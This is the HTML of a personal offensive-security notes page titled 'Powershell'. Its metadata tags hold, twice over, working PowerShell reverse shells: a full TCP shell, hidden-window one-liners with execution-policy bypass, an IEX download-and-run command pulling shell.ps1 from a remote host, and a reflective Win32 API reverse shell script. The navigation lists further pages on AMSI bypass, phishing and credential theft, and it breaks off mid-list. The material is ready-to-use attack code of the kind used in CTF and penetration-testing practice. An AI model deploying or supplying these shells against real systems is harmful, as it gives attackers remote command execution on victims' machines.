<!doctype html>
<html lang="en" data-bs-theme="auto">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
<script 
  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
</script>


<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">

<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/shell-and-payload/powershell/">

  <link rel="canonical" href="http://localhost:1313/notes/shell-and-payload/powershell/">


<title>Powershell  |  P4V1C</title>
<meta name="description" content="">

    
    <link rel="icon" href="/favicon.ico" sizes="32x32">
    
      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
    
      <link
        rel="apple-touch-icon"
        href="/apple-touch-icon.png"
        sizes="180x180"
        type="image/png"
      >
      <link
        rel="icon"
        href="/favicon-192x192.png"
        sizes="192x192"
        type="image/png"
      >
      <link
        rel="icon"
        href="/favicon-512x512.png"
        sizes="512x512"
        type="image/png"
      >
<link rel="manifest" href="/manifest.webmanifest">

<meta property="og:url" content="http://localhost:1313/notes/shell-and-payload/powershell/">
  <meta property="og:site_name" content="P4V1C">
  <meta property="og:title" content="Powershell">
  <meta property="og:description" content="$socket = new-object System.Net.Sockets.TcpClient(&#39;10.8.3.12&#39;, 4242); if($socket -eq $null){exit 1} $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $buffer = new-object System.Byte[] 1024; $encoding = new-object System.Text.AsciiEncoding; do { $writer.Flush(); $read = $null; $res = &#34;&#34; while($stream.DataAvailable -or $read -eq $null) { $read = $stream.Read($buffer, 0, 1024) } $out = $encoding.GetString($buffer, 0, $read).Replace(&#34;`r`n&#34;,&#34;&#34;).Replace(&#34;`n&#34;,&#34;&#34;); if(!$out.equals(&#34;exit&#34;)){ $args = &#34;&#34;; if($out.IndexOf(&#39; &#39;) -gt -1){ $args = $out.substring($out.IndexOf(&#39; &#39;)&#43;1); $out = $out.substring(0,$out.IndexOf(&#39; &#39;)); if($args.split(&#39; &#39;).length -gt 1){ $pinfo = New-Object System.Diagnostics.ProcessStartInfo $pinfo.FileName = &#34;cmd.exe&#34; $pinfo.RedirectStandardError = $true $pinfo.RedirectStandardOutput = $true $pinfo.UseShellExecute = $false $pinfo.Arguments = &#34;/c $out $args&#34; $p = New-Object System.Diagnostics.Process $p.StartInfo = $pinfo $p.Start() | Out-Null $p.WaitForExit() $stdout = $p.StandardOutput.ReadToEnd() $stderr = $p.StandardError.ReadToEnd() if ($p.ExitCode -ne 0) { $res = $stderr } else { $res = $stdout } } else{ $res = (&amp;&#34;$out&#34; &#34;$args&#34;) | out-string; } } else{ $res = (&amp;&#34;$out&#34;) | out-string; } if($res -ne $null){ $writer.WriteLine($res) } } }While (!$out.equals(&#34;exit&#34;)) $writer.close(); $socket.close(); $stream.Dispose()One liner shell : powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.10&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&#34;One liner shell : powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&#34;10.10.15.18&#34;,4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2=$sb&#43;&#34;PS &#34;&#43;(pwd).Path&#43;&#34;&gt; &#34;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()Download : powershell -c &#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.8.3.12:8080/shell.ps1&#39;)&#34;&lt;# DynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls. The script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess. Afterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions from ws2_32.dll. This script should be used for educational purposes only (and maybe while playing CTF :D). It was only tested on Windows 10 (x64) and is probably not stable or portable. It&#39;s only purpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as just a silly experiment :) Author: Tobias Neitzel (@qtc_de) License: GPL-3.0 License #&gt; $IP = &#34;10.8.3.12&#34; $PORT = 4242 filter Get-Type ([string]$dllName,[string]$typeName) { if( $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals($dllName) ) { $_.GetType($typeName) } } function Get-Function { Param( [string] $module, [string] $function ) if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) ) { throw &#34;Error: GetModuleHandle and GetProcAddress must be initialized first!&#34; } $moduleHandle = $GetModuleHandle.Invoke($null, @($module)) $GetProcAddress.Invoke($null, @($moduleHandle, $function)) } function Get-Delegate { Param ( [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, [Parameter(Position = 2)] [Type] $retType = [Void] ) $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;QD&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule(&#39;QM&#39;, $false). DefineType(&#39;QT&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate]) $type.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;,[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags(&#39;Runtime, Managed&#39;) $type.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $retType, $argTypes).SetImplementationFlags(&#39;Runtime, Managed&#39;) $delegate = $type.CreateType() [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate) } # Obtain the required types from the already loaded System.dll assembly $assemblies = [AppDomain]::CurrentDomain.GetAssemblies() $unsafeMethodsType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.UnsafeNativeMethods&#39; $nativeMethodsType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.NativeMethods&#39; $startupInformationType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.NativeMethods&#43;STARTUPINFO&#39; $processInformationType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.SafeNativeMethods&#43;PROCESS_INFORMATION&#39; # Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess $GetModuleHandle = $unsafeMethodsType.GetMethod(&#39;GetModuleHandle&#39;) $GetProcAddress = $unsafeMethodsType.GetMethod(&#39;GetProcAddress&#39;, [reflection.bindingflags]&#39;Public,Static&#39;, $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null); $CreateProcess = $nativeMethodsType.GetMethod(&#34;CreateProcess&#34;) # Dynamically lookup the required WSA function addresses from ws2_23.dll $ConnectAddr = Get-Function &#34;ws2_32.dll&#34; &#34;connect&#34; $WSASocketAddr = Get-Function &#34;ws2_32.dll&#34; &#34;WSASocketA&#34; $WSAStartupAddr = Get-Function &#34;ws2_32.dll&#34; &#34;WSAStartup&#34; $CloseSocketAddr = Get-Function &#34;ws2_32.dll&#34; &#34;closesocket&#34; # Create delegate types for the dynamically looked up WSA function addresses $CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int]) $WSAStartup = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int]) $Connect = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int]) $WSASocket = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr]) # Call WSAStartup to initialize WSA and create a WSA socket $WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x200)) $hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0) # Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target [Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToUInt32([ipaddress]::Parse($IP).Address)) [Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToUInt16($PORT)) [Array]::Reverse($port) [Byte[]] $buffer = 0x02, 0x00 &#43; $port &#43; $ip &#43; 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 $Connect.Invoke($hSock, $buffer, $buffer.Length) # Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures $startupInformation = $startupInformationType.GetConstructors().Invoke($null) $processInformation = $processInformationType.GetConstructors().Invoke($null) # Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION $safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true) $startupInformation.dwFlags = 0x00000100 $startupInformation.hStdInput = $safeHandle $startupInformation.hStdOutput = $safeHandle $startupInformation.hStdError = $safeHandle # Create a new cmd.exe process with redirected output as specified above $cmd = [System.Text.StringBuilder]::new(&#34;C:\\Windows\\System32\\cmd.exe&#34;) $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation)) # Finally close the socket handle that is owned by the script $CloseSocket.Invoke($hSock)">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="notes">
    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Powershell">
  <meta name="twitter:description" content="$socket = new-object System.Net.Sockets.TcpClient(&#39;10.8.3.12&#39;, 4242); if($socket -eq $null){exit 1} $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $buffer = new-object System.Byte[] 1024; $encoding = new-object System.Text.AsciiEncoding; do { $writer.Flush(); $read = $null; $res = &#34;&#34; while($stream.DataAvailable -or $read -eq $null) { $read = $stream.Read($buffer, 0, 1024) } $out = $encoding.GetString($buffer, 0, $read).Replace(&#34;`r`n&#34;,&#34;&#34;).Replace(&#34;`n&#34;,&#34;&#34;); if(!$out.equals(&#34;exit&#34;)){ $args = &#34;&#34;; if($out.IndexOf(&#39; &#39;) -gt -1){ $args = $out.substring($out.IndexOf(&#39; &#39;)&#43;1); $out = $out.substring(0,$out.IndexOf(&#39; &#39;)); if($args.split(&#39; &#39;).length -gt 1){ $pinfo = New-Object System.Diagnostics.ProcessStartInfo $pinfo.FileName = &#34;cmd.exe&#34; $pinfo.RedirectStandardError = $true $pinfo.RedirectStandardOutput = $true $pinfo.UseShellExecute = $false $pinfo.Arguments = &#34;/c $out $args&#34; $p = New-Object System.Diagnostics.Process $p.StartInfo = $pinfo $p.Start() | Out-Null $p.WaitForExit() $stdout = $p.StandardOutput.ReadToEnd() $stderr = $p.StandardError.ReadToEnd() if ($p.ExitCode -ne 0) { $res = $stderr } else { $res = $stdout } } else{ $res = (&amp;&#34;$out&#34; &#34;$args&#34;) | out-string; } } else{ $res = (&amp;&#34;$out&#34;) | out-string; } if($res -ne $null){ $writer.WriteLine($res) } } }While (!$out.equals(&#34;exit&#34;)) $writer.close(); $socket.close(); $stream.Dispose()One liner shell : powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.10.10&#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&#34;One liner shell : powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&#34;10.10.15.18&#34;,4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2=$sb&#43;&#34;PS &#34;&#43;(pwd).Path&#43;&#34;&gt; &#34;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()Download : powershell -c &#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.8.3.12:8080/shell.ps1&#39;)&#34;&lt;# DynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls. The script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess. Afterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions from ws2_32.dll. This script should be used for educational purposes only (and maybe while playing CTF :D). It was only tested on Windows 10 (x64) and is probably not stable or portable. It&#39;s only purpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as just a silly experiment :) Author: Tobias Neitzel (@qtc_de) License: GPL-3.0 License #&gt; $IP = &#34;10.8.3.12&#34; $PORT = 4242 filter Get-Type ([string]$dllName,[string]$typeName) { if( $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals($dllName) ) { $_.GetType($typeName) } } function Get-Function { Param( [string] $module, [string] $function ) if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) ) { throw &#34;Error: GetModuleHandle and GetProcAddress must be initialized first!&#34; } $moduleHandle = $GetModuleHandle.Invoke($null, @($module)) $GetProcAddress.Invoke($null, @($moduleHandle, $function)) } function Get-Delegate { Param ( [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, [Parameter(Position = 2)] [Type] $retType = [Void] ) $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;QD&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule(&#39;QM&#39;, $false). DefineType(&#39;QT&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate]) $type.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;,[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags(&#39;Runtime, Managed&#39;) $type.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $retType, $argTypes).SetImplementationFlags(&#39;Runtime, Managed&#39;) $delegate = $type.CreateType() [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate) } # Obtain the required types from the already loaded System.dll assembly $assemblies = [AppDomain]::CurrentDomain.GetAssemblies() $unsafeMethodsType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.UnsafeNativeMethods&#39; $nativeMethodsType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.NativeMethods&#39; $startupInformationType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.NativeMethods&#43;STARTUPINFO&#39; $processInformationType = $assemblies | Get-Type &#39;System.dll&#39; &#39;Microsoft.Win32.SafeNativeMethods&#43;PROCESS_INFORMATION&#39; # Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess $GetModuleHandle = $unsafeMethodsType.GetMethod(&#39;GetModuleHandle&#39;) $GetProcAddress = $unsafeMethodsType.GetMethod(&#39;GetProcAddress&#39;, [reflection.bindingflags]&#39;Public,Static&#39;, $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null); $CreateProcess = $nativeMethodsType.GetMethod(&#34;CreateProcess&#34;) # Dynamically lookup the required WSA function addresses from ws2_23.dll $ConnectAddr = Get-Function &#34;ws2_32.dll&#34; &#34;connect&#34; $WSASocketAddr = Get-Function &#34;ws2_32.dll&#34; &#34;WSASocketA&#34; $WSAStartupAddr = Get-Function &#34;ws2_32.dll&#34; &#34;WSAStartup&#34; $CloseSocketAddr = Get-Function &#34;ws2_32.dll&#34; &#34;closesocket&#34; # Create delegate types for the dynamically looked up WSA function addresses $CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int]) $WSAStartup = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int]) $Connect = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int]) $WSASocket = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr]) # Call WSAStartup to initialize WSA and create a WSA socket $WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x200)) $hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0) # Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target [Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToUInt32([ipaddress]::Parse($IP).Address)) [Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToUInt16($PORT)) [Array]::Reverse($port) [Byte[]] $buffer = 0x02, 0x00 &#43; $port &#43; $ip &#43; 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 $Connect.Invoke($hSock, $buffer, $buffer.Length) # Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures $startupInformation = $startupInformationType.GetConstructors().Invoke($null) $processInformation = $processInformationType.GetConstructors().Invoke($null) # Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION $safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true) $startupInformation.dwFlags = 0x00000100 $startupInformation.hStdInput = $safeHandle $startupInformation.hStdOutput = $safeHandle $startupInformation.hStdError = $safeHandle # Create a new cmd.exe process with redirected output as specified above $cmd = [System.Text.StringBuilder]::new(&#34;C:\\Windows\\System32\\cmd.exe&#34;) $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation)) # Finally close the socket handle that is owned by the script $CloseSocket.Invoke($hSock)">
      <meta name="twitter:site" content="@getdoks">

    
    
    <script type="application/ld+json">
  {
   "@context": "https://schema.org",
   "@type": "BreadcrumbList",
   "itemListElement": [
     {
       "@type": "ListItem",
       "item": "http://localhost:1313/",
       "name": "About Me",
       "position": 1
     },
     {
       "@type": "ListItem",
       "item": "http://localhost:1313/notes/",
       "name": "Notes",
       "position": 2
     },
     {
       "@type": "ListItem",
       "item": "http://localhost:1313/notes/shell-and-payload/",
       "name": "Reverse Shell",
       "position": 3
     },
     {
       "@type": "ListItem",
       "name": "Powershell",
       "position": 4
     }
   ]
 }
</script>





</head>

  
  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
    <div class="sticky-top">
<header class="navbar navbar-expand-lg">
  <div class="container-lg">
  
    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>

    
    
    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <circle cx="10" cy="10" r="7"></circle>
        <line x1="21" y1="21" x2="15" y2="15"></line>
      </svg>
    </button>
    
    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
      </svg>
    </button>
    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
      <div class="offcanvas-header">
        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
            <path d="M18 6l-12 12"></path>
            <path d="M6 6l12 12"></path>
          </svg>
        </button>
      </div>
      <div class="offcanvas-body">
        <aside class="doks-sidebar mt-n3">
          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
            
  
    
<nav class="section-nav docs-links">
  <ul class="list-unstyled">

  <li>
    <details>
      <summary>AD</summary>
      <ul class="list-unstyled list-nested">

  <li>
    <details>
      <summary>Local Privilege escalation</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
  </li>

  <li>
      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Tools</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
  </li>

  <li>
      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
  </li>

  <li>
      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
  </li>

  <li>
      <a href="/notes/ad/tools/impacket/">Impacket</a>
  </li>

  <li>
      <a href="/notes/ad/tools/netexec/">Netexec</a>
  </li>

  <li>
      <a href="/notes/ad/tools/powerview/">Powerview</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
      <a href="/notes/ad/ad-cs/">AD CS</a>
  </li>

  <li>
      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
  </li>

  <li>
      <a href="/notes/ad/c2/">C2</a>
  </li>

  <li>
      <a href="/notes/ad/delegation/">Delegation</a>
  </li>

  <li>
      <a href="/notes/ad/discovery/">Discovery</a>
  </li>

  <li>
      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
  </li>

  <li>
      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
  </li>

  <li>
      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
  </li>

  <li>
      <a href="/notes/ad/linux/">Linux</a>
  </li>

  <li>
      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
  </li>

  <li>
      <a href="/notes/ad/password-looting/">Password looting</a>
  </li>

  <li>
      <a href="/notes/ad/phishing/">Phishing</a>
  </li>

  <li>
      <a href="/notes/ad/pivot/">Pivot</a>
  </li>

  <li>
      <a href="/notes/ad/tickets/">Tickets</a>
  </li>

  <li>
      <a href="/notes/ad/transfert/">Transfert</a>
  </li>

  <li>
      <a href="/notes/ad/trust-attack/">Trust Attack</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details open>
      <summary>Reverse Shell</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/shell-and-payload/bash/">Bash</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
  </li>

  <li class="active" >
      <a aria-current="page" href="/notes/shell-and-payload/powershell/">Powershell</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/python/">Python</a>
  </li>

  <li>
      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Webs</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/web/command-injection/">Command Injection</a>
  </li>

  <li>
      <a href="/notes/web/cors/">Cors</a>
  </li>

  <li>
      <a href="/notes/web/csrf/">CSRF</a>
  </li>

  <li>
      <a href="/notes/web/deserialization/">Deserialization</a>
  </li>

  <li>
      <a href="/notes/web/file-upload/">File Upload</a>
  </li>

  <li>
      <a href="/notes/web/git/">Git</a>
  </li>

  <li>
      <a href="/notes/web/graphsql/">Graphsql</a>
  </li>

  <li>
      <a href="/notes/web/jwt/">JWT</a>
  </li>

  <li>
      <a href="/notes/web/path-traversal/">Path Traversal</a>
  </li>

  <li>
      <a href="/notes/web/ssrf/">SSRF</a>
  </li>

  <li>
      <a href="/notes/web/web-cache/">Web Cache</a>
  </li>

  <li>
      <a href="/notes/web/wordpress/">Wordpress</a>
  </li>

  <li>
      <a href="/notes/web/xss/">XSS</a>
  </li>

  <li>
      <a href="/notes/web/xxe/">XXE</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Services</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/services/ftp/">FTP</a>
  </li>

  <li>
      <a href="/notes/services/iis/">IIS</a>
  </li>

  <li>
      <a href="/notes/services/ldap/">Ldap</a>
  </li>

  <li>
      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
  </li>

  <li>
      <a href="/notes/services/rpcbind/">RPCbind</a>
  </li>

  <li>
      <a href="/notes/services/rsync/">Rsync</a>
  </li>

  <li>
      <a href="/notes/services/rtsp/">RTSP</a>
  </li>

  <li>
      <a href="/notes/services/smtp/">SMTP</a>
  </li>

  <li>
      <a href="/notes/services/snmp/">SNMP</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Labs</summary>
      <ul class="list-unstyled list-nested">

  <li>
    <details>
      <summary>HTB</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/lab/htb/analysis/">Analysis</a>
  </li>

  <li>
      <a href="/notes/lab/htb/caption/">Caption</a>
  </li>

  <li>
      <a href="/notes/lab/htb/certified/">Certified</a>
  </li>

  <li>
      <a href="/notes/lab/htb/cicada/">Cicada</a>
  </li>

  <li>
      <a href="/notes/lab/htb/hospital/">Hospital</a>
  </li>

  <li>
      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
  </li>

  <li>
      <a href="/notes/lab/htb/perfection/">Perfection</a>
  </li>

  <li>
      <a href="/notes/lab/htb/pov/">POV</a>
  </li>
      </ul>
    </details>
  </li>

  <li>
    <details>
      <summary>Vulnlab</summary>
      <ul class="list-unstyled list-nested">

  <li>
      <a href="/notes/lab/vulnlab/baby/">Baby</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/breach/">Breach</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/build/">Build</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/data/">Data</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/escape/">Escape</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
  </li>

  <li>
      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
